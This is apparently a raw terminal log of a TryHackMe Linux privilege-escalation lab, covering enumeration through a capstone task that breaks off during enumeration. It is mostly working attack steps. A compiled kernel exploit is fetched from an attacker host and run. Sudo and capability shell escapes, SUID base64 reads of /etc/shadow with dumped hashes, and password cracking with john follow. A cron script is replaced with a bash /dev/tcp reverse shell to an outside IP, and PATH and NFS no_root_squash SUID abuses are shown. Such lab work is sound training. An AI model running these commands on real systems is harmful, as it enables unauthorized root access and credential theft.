# https://tryhackme.com/room/linprivesc

# TASK 3 - Enumeration

sudo ssh karen@10.10.32.47
Password1

$ hostname
wade7363
$ uname -a
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
$ cat /etc/issue
Ubuntu 14.04 LTS \n \l
$ python --version
Python 2.7.6
$ exit



#TASK 5 - Privelege Escalation: Kernel Exploits

Download 37292.c
gcc 37292.c -o ofc
sudo python3 -m http.server

sudo ssh karen@10.10.32.47
Password1

$ /tmp
$ wget http://<ATTACKER-IP>:8000/ofc
ls -la
total 40
drwxrwxrwt  4 root  root   4096 Nov 27 16:50 .
drwxr-xr-x 23 root  root   4096 Jun 18 04:16 ..
drwxrwxrwt  2 root  root   4096 Nov 27 16:32 .ICE-unix
-rw-rw-r--  1 karen karen 17024 Nov 27 16:46 ofc
-r--r--r--  1 root  root     11 Nov 27 16:32 .X0-lock
drwxrwxrwt  2 root  root   4096 Nov 27 16:32 .X11-unix
$ chmod +x ofc
$ ./ofc
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
# cd /home
# ls
matt
# cd matt
# ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos  examples.desktop  flag1.txt
# cat flag1.txt
THM-28392872729920



# TASK 6 - Privelege Escalation: Sudo

sudo ssh karen@10.10.74.29
Password1

$ sudo -l
Matching Defaults entries for karen on ip-10-10-74-29:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-10-74-29:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
$ sudo find . -name flag2.txt
./home/ubuntu/flag2.txt
$ cd /home/ubuntu
$ cat flag2.txt
THM-402028394

$ sudo nano
^R^X
reset; sh 1>&0 2>&0
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /etc/shadow 
root:*:18561:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:18796::::::
ubuntu:!:18796:0:99999:7:::
lxd:!:18796::::::
karen:$6$QHTxjZ77ZcxU54ov$DCV2wd1mG5wJoTB.cXJoXtLVDZe1Ec1jbQFv3ICAYbnMqdhJzIEi3H4qyyKO7T75h4hHQWuWWzBH7brjZiSaX0:18796:0:99999:7:::
frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1:18796:0:99999:7:::

# TASK 7 - Privelege Escalation: SUID 

sudo ssh karen@10.10.48.201
Password1

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
gerryconway:x:1001:1001::/home/gerryconway:/bin/sh
user2:x:1002:1002::/home/user2:/bin/sh
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
karen:x:1003:1003::/home/karen:/bin/sh

$ find / -type f -perm -04000 -ls 2>/dev/null
       66     40 -rwsr-xr-x   1 root     root        40152 Jan 27  2020 /snap/core/10185/bin/mount
       80     44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /snap/core/10185/bin/ping
       81     44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /snap/core/10185/bin/ping6
       98     40 -rwsr-xr-x   1 root     root        40128 Mar 25  2019 /snap/core/10185/bin/su
      116     27 -rwsr-xr-x   1 root     root        27608 Jan 27  2020 /snap/core/10185/bin/umount
     2610     71 -rwsr-xr-x   1 root     root        71824 Mar 25  2019 /snap/core/10185/usr/bin/chfn
     2612     40 -rwsr-xr-x   1 root     root        40432 Mar 25  2019 /snap/core/10185/usr/bin/chsh
     2689     74 -rwsr-xr-x   1 root     root        75304 Mar 25  2019 /snap/core/10185/usr/bin/gpasswd
     2781     39 -rwsr-xr-x   1 root     root        39904 Mar 25  2019 /snap/core/10185/usr/bin/newgrp
     2794     53 -rwsr-xr-x   1 root     root        54256 Mar 25  2019 /snap/core/10185/usr/bin/passwd
     2904    134 -rwsr-xr-x   1 root     root       136808 Jan 31  2020 /snap/core/10185/usr/bin/sudo
     3003     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core/10185/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3375    419 -rwsr-xr-x   1 root     root              428240 May 26  2020 /snap/core/10185/usr/lib/openssh/ssh-keysign
     6437    109 -rwsr-xr-x   1 root     root              110792 Oct  8  2020 /snap/core/10185/usr/lib/snapd/snap-confine
     7615    386 -rwsr-xr--   1 root     dip               394984 Jul 23  2020 /snap/core/10185/usr/sbin/pppd
       56     43 -rwsr-xr-x   1 root     root               43088 Mar  5  2020 /snap/core18/1885/bin/mount
       65     63 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /snap/core18/1885/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44664 Mar 22  2019 /snap/core18/1885/bin/su
       99     27 -rwsr-xr-x   1 root     root               26696 Mar  5  2020 /snap/core18/1885/bin/umount
     1698     75 -rwsr-xr-x   1 root     root               76496 Mar 22  2019 /snap/core18/1885/usr/bin/chfn
     1700     44 -rwsr-xr-x   1 root     root               44528 Mar 22  2019 /snap/core18/1885/usr/bin/chsh
     1752     75 -rwsr-xr-x   1 root     root               75824 Mar 22  2019 /snap/core18/1885/usr/bin/gpasswd
     1816     40 -rwsr-xr-x   1 root     root               40344 Mar 22  2019 /snap/core18/1885/usr/bin/newgrp
     1828     59 -rwsr-xr-x   1 root     root               59640 Mar 22  2019 /snap/core18/1885/usr/bin/passwd
     1919    146 -rwsr-xr-x   1 root     root              149080 Jan 31  2020 /snap/core18/1885/usr/bin/sudo
     2006     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2314    427 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign
     7477     52 -rwsr-xr--   1 root     messagebus         51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    13816    464 -rwsr-xr-x   1 root     root              473576 May 29  2020 /usr/lib/openssh/ssh-keysign
    13661     24 -rwsr-xr-x   1 root     root               22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
     7479     16 -rwsr-xr-x   1 root     root               14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
    13676    128 -rwsr-xr-x   1 root     root              130152 Oct  8  2020 /usr/lib/snapd/snap-confine
     1856     84 -rwsr-xr-x   1 root     root               85064 May 28  2020 /usr/bin/chfn
     2300     32 -rwsr-xr-x   1 root     root               31032 Aug 16  2019 /usr/bin/pkexec
     1816    164 -rwsr-xr-x   1 root     root              166056 Jul 15  2020 /usr/bin/sudo
     1634     40 -rwsr-xr-x   1 root     root               39144 Jul 21  2020 /usr/bin/umount
     1860     68 -rwsr-xr-x   1 root     root               68208 May 28  2020 /usr/bin/passwd
     1859     88 -rwsr-xr-x   1 root     root               88464 May 28  2020 /usr/bin/gpasswd
     1507     44 -rwsr-xr-x   1 root     root               44784 May 28  2020 /usr/bin/newgrp
     1857     52 -rwsr-xr-x   1 root     root               53040 May 28  2020 /usr/bin/chsh
     1722     44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64
     1674     68 -rwsr-xr-x   1 root     root               67816 Jul 21  2020 /usr/bin/su
     2028     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
     2166     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
     1633     56 -rwsr-xr-x   1 root     root               55528 Jul 21  2020 /usr/bin/mount


$ cat /etc/shadow
cat: /etc/shadow: Permission denied
$ LFILE=/etc/shadow
$ /usr/bin/base64 "$LFILE" | base64 --decode
root:*:18561:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:18796::::::
ubuntu:!:18796:0:99999:7:::
gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:18796:0:99999:7:::
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
lxd:!:18796::::::
karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:18796:0:99999:7:::

$ cd /home/ubuntu
$ ls
flag3.txt
$ cat flag3.txt
cat: flag3.txt: Permission denied
$ su user2
Password: 
$ id
uid=1002(user2) gid=1002(user2) groups=1002(user2)
$ find / -type f -perm -04000 -ls 2>/dev/null
       66     40 -rwsr-xr-x   1 root     root        40152 Jan 27  2020 /snap/core/10185/bin/mount
       80     44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /snap/core/10185/bin/ping
       81     44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /snap/core/10185/bin/ping6
       98     40 -rwsr-xr-x   1 root     root        40128 Mar 25  2019 /snap/core/10185/bin/su
      116     27 -rwsr-xr-x   1 root     root        27608 Jan 27  2020 /snap/core/10185/bin/umount
     2610     71 -rwsr-xr-x   1 root     root        71824 Mar 25  2019 /snap/core/10185/usr/bin/chfn
     2612     40 -rwsr-xr-x   1 root     root        40432 Mar 25  2019 /snap/core/10185/usr/bin/chsh
     2689     74 -rwsr-xr-x   1 root     root        75304 Mar 25  2019 /snap/core/10185/usr/bin/gpasswd
     2781     39 -rwsr-xr-x   1 root     root        39904 Mar 25  2019 /snap/core/10185/usr/bin/newgrp
     2794     53 -rwsr-xr-x   1 root     root        54256 Mar 25  2019 /snap/core/10185/usr/bin/passwd
     2904    134 -rwsr-xr-x   1 root     root       136808 Jan 31  2020 /snap/core/10185/usr/bin/sudo
     3003     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core/10185/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3375    419 -rwsr-xr-x   1 root     root              428240 May 26  2020 /snap/core/10185/usr/lib/openssh/ssh-keysign
     6437    109 -rwsr-xr-x   1 root     root              110792 Oct  8  2020 /snap/core/10185/usr/lib/snapd/snap-confine
     7615    386 -rwsr-xr--   1 root     dip               394984 Jul 23  2020 /snap/core/10185/usr/sbin/pppd
       56     43 -rwsr-xr-x   1 root     root               43088 Mar  5  2020 /snap/core18/1885/bin/mount
       65     63 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /snap/core18/1885/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44664 Mar 22  2019 /snap/core18/1885/bin/su
       99     27 -rwsr-xr-x   1 root     root               26696 Mar  5  2020 /snap/core18/1885/bin/umount
     1698     75 -rwsr-xr-x   1 root     root               76496 Mar 22  2019 /snap/core18/1885/usr/bin/chfn
     1700     44 -rwsr-xr-x   1 root     root               44528 Mar 22  2019 /snap/core18/1885/usr/bin/chsh
     1752     75 -rwsr-xr-x   1 root     root               75824 Mar 22  2019 /snap/core18/1885/usr/bin/gpasswd
     1816     40 -rwsr-xr-x   1 root     root               40344 Mar 22  2019 /snap/core18/1885/usr/bin/newgrp
     1828     59 -rwsr-xr-x   1 root     root               59640 Mar 22  2019 /snap/core18/1885/usr/bin/passwd
     1919    146 -rwsr-xr-x   1 root     root              149080 Jan 31  2020 /snap/core18/1885/usr/bin/sudo
     2006     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2314    427 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign
     7477     52 -rwsr-xr--   1 root     messagebus         51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    13816    464 -rwsr-xr-x   1 root     root              473576 May 29  2020 /usr/lib/openssh/ssh-keysign
    13661     24 -rwsr-xr-x   1 root     root               22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
     7479     16 -rwsr-xr-x   1 root     root               14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
    13676    128 -rwsr-xr-x   1 root     root              130152 Oct  8  2020 /usr/lib/snapd/snap-confine
     1856     84 -rwsr-xr-x   1 root     root               85064 May 28  2020 /usr/bin/chfn
     2300     32 -rwsr-xr-x   1 root     root               31032 Aug 16  2019 /usr/bin/pkexec
     1816    164 -rwsr-xr-x   1 root     root              166056 Jul 15  2020 /usr/bin/sudo
     1634     40 -rwsr-xr-x   1 root     root               39144 Jul 21  2020 /usr/bin/umount
     1860     68 -rwsr-xr-x   1 root     root               68208 May 28  2020 /usr/bin/passwd
     1859     88 -rwsr-xr-x   1 root     root               88464 May 28  2020 /usr/bin/gpasswd
     1507     44 -rwsr-xr-x   1 root     root               44784 May 28  2020 /usr/bin/newgrp
     1857     52 -rwsr-xr-x   1 root     root               53040 May 28  2020 /usr/bin/chsh
     1722     44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64
     1674     68 -rwsr-xr-x   1 root     root               67816 Jul 21  2020 /usr/bin/su
     2028     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
     2166     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
     1633     56 -rwsr-xr-x   1 root     root               55528 Jul 21  2020 /usr/bin/mount
$ LFILE=flag3.txt
$ /usr/bin/base64 "$LFILE" | base64 --decode
THM-3847834



# TASK 8 - Privelege Escalation: Capabilities
 
sudo ssh karen@10.10.43.132
Password1

$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
$ /home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
Erase is control-H (^H).
# 
# 
# id
uid=0(root) gid=1001(karen) groups=1001(karen)
# cd /home/ubuntu
# ls
flag4.txt  view
# cat flag4.txt
THM-9349843


# TASK 9 - Privelege Escalation: Cron Jobs

sudo ssh karen@10.10.43.132
Password1

$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py


$ pwd 
/home/karen
$ cat backup.sh
#!/bin/bash
cd /home/admin/1/2/3/Results
zip -r /home/admin/download.zip ./*
$ nano backup.sh

## https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

$ chmod +x backup.sh

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444  
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.145.211.
Ncat: Connection from 10.10.145.211:55764.
bash: cannot set terminal process group (12279): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-10-145-211:~# pwd
pwd
/root
root@ip-10-10-145-211:~# ls
ls
snap
root@ip-10-10-145-211:~# cd /home/ubuntu
cd /home/ubuntu
root@ip-10-10-145-211:/home/ubuntu# ls
ls
flag5.txt
root@ip-10-10-145-211:/home/ubuntu# cat flag5.txt
cat flag5.txt
THM-383000283
root@ip-10-10-145-211:/home/ubuntu# cat /etc/shadow
cat /etc/shadow
root:*:18561:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:18798::::::
ubuntu:!:18798:0:99999:7:::
karen:$6$ZC4srkt5HufYpAAb$GVDM6arO/qQU.o0kLOZfMLAFGNHXULH5bLlidB455aZkKrMvdB1upyMZZzqdZuzlJTuTHTlsKzQAbSZJr9iE21:18798:0:99999:7:::
lxd:!:18798::::::
matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.:18798:0:99999:7:::


┌──(kali㉿kali)-[~]
└─$ nano matt      
$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.

┌──(kali㉿kali)-[~]
└─$ john matt       
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
123456           (?)     
1g 0:00:00:00 DONE 2/3 (2021-11-28 02:35) 9.090g/s 2327p/s 2327c/s 2327C/s 123456..franklin
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 



# TASK 10 - Privelege Escalation: PATH

sudo ssh karen@10.10.191.29
Password1

$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
$ find / -writable 2>/dev/null
$ find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
dev/char
dev/fd
dev/full
dev/fuse
dev/log
dev/mqueue
dev/net
dev/null
dev/ptmx
dev/pts
dev/random
dev/shm
dev/stderr
dev/stdin
dev/stdout
dev/tty
dev/urandom
dev/zero
etc/udev
home/murdoch  ************************
run/acpid.socket
run/dbus
run/lock
run/screen
run/shm
run/snapd-snap.socket
run/snapd.socket
run/systemd
run/user
run/uuidd
snap/core
snap/core18
snap/core20
sys/fs
sys/kernel
tmp
tmp/.ICE-unix
tmp/.Test-unix
tmp/.X11-unix
tmp/.XIM-unix
tmp/.font-unix
usr/lib
var/crash
var/lock
var/tmp
$ find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep usr | sort -u
usr/lib
$ 
$ export PATH=/tmp:$PATH
$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
$ echo "/bin/bash" > thm
$ chmod 777 thm
$ chmod +x thm
$ chmod +s thm
$ ls -l thm
-rwxrwxrwx 1 karen karen 10 Nov 28 07:48 thm
$ cd ../murdoch
$ ls
test  thm.py
$ ./test
root@ip-10-10-191-29:/home/murdoch# cd /home/matt
root@ip-10-10-191-29:/home/matt# ls
flag6.txt
root@ip-10-10-191-29:/home/matt# cat flag6.txt
THM-736628929



# TASK 11 - Privelege Escalation: NFS

┌──(kali㉿kali)-[~]
└─$ showmount -e 10.10.41.95
Export list for 10.10.41.95:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *

┌──(kali㉿kali)-[~]
└─$ sudo -i                    
[sudo] password for kali: 
┏━(Message from Kali developers)
┃
┃ We have kept /usr/bin/python pointing to Python 2 for backwards
┃ compatibility. Learn how to change this and avoid this message:
┃ ⇒ https://www.kali.org/docs/general-use/python3-transition/
┃
┗━(Run: “touch ~/.hushlogin” to hide this message)
┌──(root💀kali)-[~]
└─# cd / 
                                   
┌──(root💀kali)-[/]
└─# ls
bin   dev  home        initrd.img.old  lib32  libx32      media  opt   root  sbin  srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib             lib64  lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
                                        
┌──(root💀kali)-[/]
└─# cd mnt     

┌──(root💀kali)-[/mnt]
└─# mkdir lpe                                                                                                                                

┌──(root💀kali)-[/mnt]
└─# mount -o rw 10.10.41.95:/home/ubuntu/sharedfolder /mnt/lpe
                                        
┌──(root💀kali)-[/mnt]
└─# cd lpe 

┌──(root💀kali)-[/mnt/lpe]
└─# nano lpe.c                 

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(void) {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}

┌──(root💀kali)-[/mnt/lpe]
└─# gcc lpe.c -o lpe

┌──(root💀kali)-[/mnt/lpe]
└─# chmod +x lpe   

┌──(root💀kali)-[/mnt/lpe]
└─# chmod +s lpe
      

sudo ssh karen@10.10.41.95
Password1

$ cat etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
$ cd /home/ubuntu/sharedfolder
$ ls 
lpe  lpe.c
$ ./lpe
root@ip-10-10-41-95:/home/ubuntu/sharedfolder# cd /home/matt
root@ip-10-10-41-95:/home/matt# cat flag7.txt
THM-89384012



# TASK 12 - Capstone Challenge

sudo ssh leonard@10.10.200.231
Penny123

[leonard@ip-10-10-200-231 ~]$ id
uid=1000(leonard) gid=1000(leonard) groups=1000(leonard) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[leonard@ip-10-10-200-231 ~]$ hostname
ip-10-10-200-231
[leonard@ip-10-10-200-231 ~]$ uname -a
Linux ip-10-10-200-231 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
[leonard@ip-10-10-200-231 ~]$ cat /etc/issue
\S
Kernel \r on an \m

[leonard@ip-10-10-200-231 ~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for leonard: 
Sorry, user leonard may not run sudo on ip-10-10-200-231.
[leonard@ip-10-10-200-231 ~]$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
